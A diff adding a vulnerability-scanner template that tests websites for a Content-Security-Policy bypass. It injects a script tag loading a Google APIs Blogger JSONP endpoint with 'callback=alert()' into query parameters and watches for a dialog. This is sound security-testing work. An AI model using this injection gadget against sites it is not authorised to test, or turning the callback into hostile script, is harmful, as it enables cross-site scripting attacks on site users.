@@ -1,0 +1,55 @@
+id: googleapis-blogger-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google APIs Blogger
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googleapis-blogger
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "googleapis.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googleapis_blogger_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googleapis_blogger_csp_xss == true"
+# digest: 490a00463044022001392814e5c234367cbf6a154034cc1345833e0a66232f05e24b35387d09ee9d02201b826624a5790798d8f3f286f2be8f44ea853090e561d625421800bf259ed2e4:922c64590222798bb761d5b6d8e72950
